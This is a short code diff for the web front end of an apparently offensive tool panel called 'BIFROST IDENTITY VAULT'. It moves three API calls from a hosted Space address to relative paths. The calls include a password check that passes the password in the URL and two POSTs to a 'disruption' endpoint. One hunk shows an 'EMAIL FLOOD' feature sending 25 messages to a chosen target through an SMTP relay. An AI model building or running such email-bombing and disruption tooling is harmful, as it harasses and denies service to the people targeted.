@@ -1406,7 +1406,7 @@
             
             try {
                 // BIFROST IDENTITY VAULT (v19.0 HF Space)
-                const response = await fetch(`https://rxtri-bifrost.hf.space/api/auth?action=verify&pass=${encodeURIComponent(pass)}`);
+                const response = await fetch(`/api/auth?action=verify&pass=${encodeURIComponent(pass)}`);
                 const result = await response.json();
 
                 if (result.status === 'success') {
@@ -1564,7 +1564,7 @@
             res.innerText = `> INITIALIZING EMAIL FLOOD...\n> TARGET: ${target}\n> CONNECTING TO SMTP RELAY...`;
             addLog(`EMAIL FLOOD INITIATED: ${target}`);
             try {
-                const response = await fetch(`https://rxtri-bifrost.hf.space/api/disruption?t=${Date.now()}`, {
+                const response = await fetch(`/api/disruption?t=${Date.now()}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ target: target, count: 25, mode: 'email' })
@@ -1626,7 +1626,7 @@
             }
 
             try {
-                const response = await fetch(`https://rxtri-bifrost.hf.space/api/disruption?t=${Date.now()}`, {
+                const response = await fetch(`/api/disruption?t=${Date.now()}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
